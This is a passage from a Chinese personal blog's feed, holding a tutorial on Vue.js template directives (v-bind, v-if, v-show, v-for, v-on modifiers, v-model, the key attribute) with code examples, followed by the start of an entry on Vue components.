class="string">"url"</span>&gt;链接&lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp">...</span></span><br><span class="line"><span class="regexp">    data: &#123;</span></span><br><span class="line"><span class="regexp">        url: "http:/</span><span class="regexp">/www.abc.com"</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br></pre></td></tr></table></figure></p><p>字符串语法可以调用methods函数，动态调整参数<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line">&lt;a v-bind:href=<span class="string">"geturl(this.param)"</span>&gt;链接&lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp">...</span></span><br><span class="line"><span class="regexp">    data：&#123;</span></span><br><span class="line"><span class="regexp">        param: "123"</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">    methods: &#123;</span></span><br><span class="line"><span class="regexp">        geturl : function()&#123;</span></span><br><span class="line"><span class="regexp">            return "http:/</span><span class="regexp">/"+param;</span></span><br><span class="line"><span class="regexp">        &#125;</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br></pre></td></tr></table></figure></p><h3 id="对象语法"><a href="#对象语法" class="headerlink" title="对象语法"></a>对象语法</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用语法糖(省略写法)，根据data中的布尔型isActive，来判断是否显示字符串active</span></span><br><span class="line">&lt;div :<span class="class"><span class="keyword">class</span></span>=<span class="string">"&#123; 'active': isActive , 'error': isError &#125;"</span>&gt; <span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">...</span><br><span class="line">    data: &#123;</span><br><span class="line">        isActive: <span class="literal">true</span>,</span><br><span class="line">        isError: <span class="literal">false</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="数组语法"><a href="#数组语法" class="headerlink" title="数组语法"></a>数组语法</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用语法糖，根据data中的对象值，来填入class</span></span><br><span class="line">&lt;div :<span class="class"><span class="keyword">class</span></span>=<span class="string">"[ activeCls , errorCls ]"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">...</span><br><span class="line">    data: &#123;</span><br><span class="line">        activeCls : <span class="string">'actice'</span>,</span><br><span class="line">        errorCls : <span class="string">'error'</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="数组语法-对象语法"><a href="#数组语法-对象语法" class="headerlink" title="数组语法 + 对象语法"></a>数组语法 + 对象语法</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用语法糖，isActive为正时，显示active</span></span><br><span class="line">&lt;div :<span class="class"><span class="keyword">class</span></span>=<span class="string">"[ &#123; 'active': isActive &#125;, errorCls ]"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">...</span><br><span class="line">    data: &#123;</span><br><span class="line">        isActive: <span class="literal">true</span>,</span><br><span class="line">        errorCls : <span class="string">'error'</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>　　不过可用变量也不一定是<code>data</code>下的数据，在<code>computed选项</code>,或者在语句中产生的变量也可以使用</p><h2 id="v-if-v-else-if-v-else"><a href="#v-if-v-else-if-v-else" class="headerlink" title="v-if 　v-else-if　 v-else"></a>v-if 　v-else-if　 v-else</h2><p>　　条件渲染指令<br>　　<code>v-else-if</code>要紧跟<code>v-if</code>,<code>v-else</code>要紧跟<code>v-else-if</code>或<code>v-if</code>。表达式的值为真时，当前元素/组件及<strong>所有子节点</strong>将被渲染，为假时被移除。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">"type === 'A'"</span>&gt;</span></span><br><span class="line">  A</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else-if</span>=<span class="string">"type === 'B'"</span>&gt;</span></span><br><span class="line">  B</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else-if</span>=<span class="string">"type === 'C'"</span>&gt;</span></span><br><span class="line">  C</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else</span>&gt;</span></span><br><span class="line">  Not A/B/C</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="template-多元素渲染"><a href="#template-多元素渲染" class="headerlink" title="template 多元素渲染"></a>template 多元素渲染</h3><p>　　如果以此判断的是<strong>多个元素</strong>，可以在Vue.js内置的<code>&lt;template&gt;</code>元素上使用条件指令，最终渲染的结果不会包括该元素<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-if</span>=<span class="string">"status === 1"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>test 1<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>test 2<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">        el: <span class="string">'#app'</span>,</span></span><br><span class="line"><span class="undefined">        data: &#123;</span></span><br><span class="line"><span class="undefined">            status: 1</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h2 id="v-show"><a href="#v-show" class="headerlink" title="v-show"></a>v-show</h2><p>　　根据表达式之真假值，切换元素的<code>display</code>CSS属性。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-show</span>=<span class="string">"status === 1"</span>&gt;</span>Hello!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure></p><blockquote><p>v-show 不支持 <code>&lt;template&gt;</code> 元素，也不支持 <code>v-else</code><br><code>v-show</code> 不管初始条件是什么，元素总是会被渲染，并且只是简单地基于 CSS 进行切换。</p></blockquote><h2 id="v-for"><a href="#v-for" class="headerlink" title="v-for"></a>v-for</h2><p>　　数组、对象遍历显示时会用到<code>v-for</code>，他的表达式需结合<code>in</code>,利用<code>item in items</code>的形式来使用。<code>items</code>是源数据数组并且<code>item</code>是数组元素迭代的别名。</p><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 数组，值 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-for</span>=<span class="string">"item in items"</span>&gt;</span></span><br><span class="line">  &#123;&#123; item.text &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 数组，值+索引 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-for</span>=<span class="string">"(item,index) in items"</span>&gt;</span></span><br><span class="line">  &#123;&#123; item.text &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 对象,值 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-for</span>=<span class="string">"value in object"</span>&gt;</span></span><br><span class="line">  &#123;&#123; value &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 对象，值+键名 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-for</span>=<span class="string">"(value, key) in object"</span>&gt;</span></span><br><span class="line">  &#123;&#123; key &#125;&#125;: &#123;&#123; value &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 对象，值+键名+索引 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-for</span>=<span class="string">"(value, key, index) in object"</span>&gt;</span></span><br><span class="line">  &#123;&#123; index &#125;&#125;. &#123;&#123; key &#125;&#125;: &#123;&#123; value &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="template-多元素渲染-1"><a href="#template-多元素渲染-1" class="headerlink" title="template 多元素渲染"></a>template 多元素渲染</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-for</span>=<span class="string">"book in books"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>书名：&#123;&#123;book.name&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>作者：&#123;&#123;book.name&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="数组更新"><a href="#数组更新" class="headerlink" title="数组更新"></a>数组更新</h3><p>改变数组会触发视图更新</p><ul><li>push()</li><li>pop()</li><li>shift()</li><li>unshift()</li><li>splice():</li><li>sort()</li><li>reverse()</li></ul><p>返回新数组，不会触发视图更新</p><ul><li>filter()</li><li>concat()</li><li>slice()</li></ul><p>不会触发视图更新的：</p><ul><li>通过索引直接设置项 <code>app.books[3]={}</code></li><li>修改数组长度 <code>app.books.length=1</code></li></ul><p>第一个问题可以使用<code>Vue.ser</code>和<code>$set</code>来实现<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Vue.set(app.books, <span class="number">3</span>, &#123;</span><br><span class="line">    name: <span class="string">'《CSS揭秘》'</span>,</span><br><span class="line">    author: <span class="string">'Lea Verou'</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//webpack中使用组件化，默认是没有导入Vue的，使用$set</span></span><br><span class="line"><span class="keyword">this</span>.$set(app.books, <span class="number">3</span>,&#123;</span><br><span class="line">    name: <span class="string">'《CSS揭秘》'</span>,</span><br><span class="line">    author: <span class="string">'Lea Verou'</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>第一个问题，第二个问题都可以使用<code>splice</code>来解决<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">app.books.splice(<span class="number">3</span>,<span class="number">1</span>,&#123;</span><br><span class="line">    name: <span class="string">'《CSS揭秘》'</span>,</span><br><span class="line">    author: <span class="string">'Lea Verou'</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//修改数组长度</span></span><br><span class="line">app.books.splice(<span class="number">1</span>);</span><br></pre></td></tr></table></figure></p><h2 id="v-on-事件监听器"><a href="#v-on-事件监听器" class="headerlink" title="v-on 事件监听器"></a>v-on 事件监听器</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//点击触发事件，执行js</span></span><br><span class="line">&lt;button v-on:click=<span class="string">"handleClose"</span>&gt;点击隐藏&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/语法糖写法</span></span><br><span class="line"><span class="regexp">&lt;button @click="handleClose"&gt;点击隐藏&lt;/</span>button&gt;</span><br><span class="line">...</span><br><span class="line">    methods： &#123;</span><br><span class="line">        handleClose： <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>原生事件列表：</p><ul><li>click</li><li>change</li></ul><blockquote><p>特殊参数$event:用于访问原生DOM事件，比如调用 event.stopPropagation()</p></blockquote><h3 id="事件修饰符"><a href="#事件修饰符" class="headerlink" title="事件修饰符"></a>事件修饰符</h3><p>　　在事件处理程序中调用<code>event.preventDefault()</code>或 <code>event.stopPropagation()</code>是非常常见的需求。尽管我们可以在方法中轻松实现这点，但更好的方式是：方法只有纯粹的数据逻辑，而不是去处理 DOM 事件细节。</p><ul><li><strong>stop</strong>：调用 event.stopPropagation()</li><li><strong>.prevent</strong>：调用 event.preventDefault()</li><li><strong>.capture</strong>：添加事件侦听器时使用 capture 模式</li><li><strong>.self</strong>：只当事件是从侦听器绑定的元素本身触发时才触发回调</li><li><strong>.once</strong>：只触发一次回调<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 阻止单击事件继续传播 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">v-on:click.stop</span>=<span class="string">"doThis"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 提交事件不再重载页面 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">v-on:submit.prevent</span>=<span class="string">"onSubmit"</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 修饰符可以串联 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">v-on:click.stop.prevent</span>=<span class="string">"doThat"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 只有修饰符 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">v-on:submit.prevent</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 添加事件监听器时使用事件捕获模式 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 即元素自身触发的事件先在此处处理，然后才交由内部元素进行处理 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-on:click.capture</span>=<span class="string">"doThis"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 只当在 event.target 是当前元素自身时触发处理函数 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 即事件不是从内部元素触发的 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-on:click.self</span>=<span class="string">"doThat"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="按键修饰符"><a href="#按键修饰符" class="headerlink" title="按键修饰符"></a>按键修饰符</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@keyup<span class="number">.13</span>=<span class="string">"submit"</span> <span class="comment">//在keyCode是13时 调用vm.submit</span></span><br><span class="line">@click.ctrl=<span class="string">"submit"</span> <span class="comment">//组合ctrl+点击 调用</span></span><br></pre></td></tr></table></figure><h2 id="v-model-双向绑定"><a href="#v-model-双向绑定" class="headerlink" title="v-model 双向绑定"></a>v-model 双向绑定</h2><p>　　你可以用 <code>v-model</code> 指令在表单 <code>&lt;input&gt;</code> 及 <code>&lt;textarea&gt;</code> 元素上创建双向数据绑定。它会根据控件类型自动选取正确的方法来更新元素。尽管有些神奇，但 v-model 本质上不过是语法糖。它负责监听用户的输入事件以更新数据，并对一些极端场景进行一些特殊处理。</p><blockquote><p><code>v-model</code> 会忽略所有表单元素的 <code>value</code>、<code>checked</code>、<code>selected</code> 特性的初始值而总是将 Vue 实例的数据作为数据来源。你应该通过 JavaScript 在组件的 data 选项中声明初始值。</p></blockquote><blockquote><p>对于需要使用输入法 (如中文、日文、韩文等) 的语言，你会发现 v-model 不会在输入法组合文字过程中得到更新。如果你也想处理这个过程，请使用 input 事件。(需要自己写吧)</p></blockquote><p>由于每个控件都可以使用<code>v-model</code>绑定到<code>data</code>数据:<br>控件分配：</p><ul><li>文本 <code>&lt;input&gt;</code></li><li>多行文本 <code>&lt;textarea&gt;</code></li><li>复选框 <code>&lt;input type=&quot;checkbox&quot;&gt;</code></li><li>单选按钮 <code>&lt;input type=&quot;radio&quot;&gt;</code></li><li>选择框 <code>&lt;select&gt;</code></li></ul><p>多个复选框，绑定到同一个数组：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">'example-3'</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">id</span>=<span class="string">"jack"</span> <span class="attr">value</span>=<span class="string">"Jack"</span> <span class="attr">v-model</span>=<span class="string">"checkedNames"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"jack"</span>&gt;</span>Jack<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">id</span>=<span class="string">"john"</span> <span class="attr">value</span>=<span class="string">"John"</span> <span class="attr">v-model</span>=<span class="string">"checkedNames"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"john"</span>&gt;</span>John<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">id</span>=<span class="string">"mike"</span> <span class="attr">value</span>=<span class="string">"Mike"</span> <span class="attr">v-model</span>=<span class="string">"checkedNames"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"mike"</span>&gt;</span>Mike<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span>&gt;</span>Checked names: &#123;&#123; checkedNames &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">  el: <span class="string">'#example-3'</span>,</span></span><br><span class="line"><span class="undefined">  data: &#123;</span></span><br><span class="line"><span class="undefined">    checkedNames: []</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>其他请查看 <a href="https://cn.vuejs.org/v2/guide/forms.html#%E5%9F%BA%E7%A1%80%E7%94%A8%E6%B3%95" target="_blank" rel="noopener">官网</a></p><h3 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h3><ul><li><code>.lazy</code>：默认是在input时间中同步输入框的内容，<code>.lazy</code>会转变为在change事件中的同步。v-model.lazy</li><li><code>.number</code>：可以讲输入转换为Number类型，否则即使输入的是数字，他的类型其实是字符串。v-model.number</li><li><code>.trim</code>：可以自动过滤输入的首尾空格。v-model.trim</li></ul><hr><h1 id="Vue特殊特性"><a href="#Vue特殊特性" class="headerlink" title="Vue特殊特性"></a>Vue特殊特性</h1><h2 id="属性-key"><a href="#属性-key" class="headerlink" title="属性 key"></a>属性 key</h2><p>　　Vue在渲染元素时，处于效率考虑，会尽可能地复用已有的元素而非重新渲染，比如下面的示例：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-if</span>=<span class="string">"type === 'name'"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>用户名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">placeholder</span>=<span class="string">"输入用户名"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-else</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>邮箱：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">placeholder</span>=<span class="string">"输入邮箱"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"handleToggleClick"</span>&gt;</span>切换输入类型<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript">    el: <span class="string">'#app'</span>,</span></span><br><span class="line"><span class="undefined">    data: &#123;</span></span><br><span class="line"><span class="javascript">        type: <span class="string">'name'</span></span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    methods: &#123;</span></span><br><span class="line"><span class="javascript">        handleToggleClick: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">this</span>.type = <span class="keyword">this</span>.type === <span class="string">'name'</span> ? <span class="string">'mail'</span> : <span class="string">'name'</span>;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br></pre></td></tr></table></figure></p><p>　　上面的程序点击切换按钮虽然DOM变了，但是之前在输入框键入的内容没有改变，只是替换了placeholder的内容,说明<code>&lt;input&gt;</code>元素被复用了。</p><p>　　Vue.js提供的<code>key</code>属性，它可以让你自己决定是否要复用元素。<br>　　有相同父元素的子元素必须有独特的 key。重复的 key 会造成渲染错误。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">placeholder</span>=<span class="string">"输入用户名"</span> <span class="attr">key</span>=<span class="string">"name-input"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">placeholder</span>=<span class="string">"输入邮箱"</span> <span class="attr">key</span>=<span class="string">"mail-input"</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>　　如此可以使input元素各自有key</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;— 点点开发技能树  —&lt;br&gt;— Vue环境 及 语法 —&lt;br&gt;
    
    </summary>
    
    
      <category term="前端" scheme="http://lalajun.com/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="Vue" scheme="http://lalajun.com/tags/Vue/"/>
    
  </entry>
  
  <entry>
    <title>Vue-组件</title>
    <link href="http://lalajun.com/2018/07/11/Vue%E7%BB%84%E4%BB%B6/"/>
    <id>http://lalajun.com/2018/07/11/Vue组件/</id>
    <published>2018-07-11T06:05:28.000Z</published>
    <updated>2018-07-22T06:22:51.879Z</updated>
    
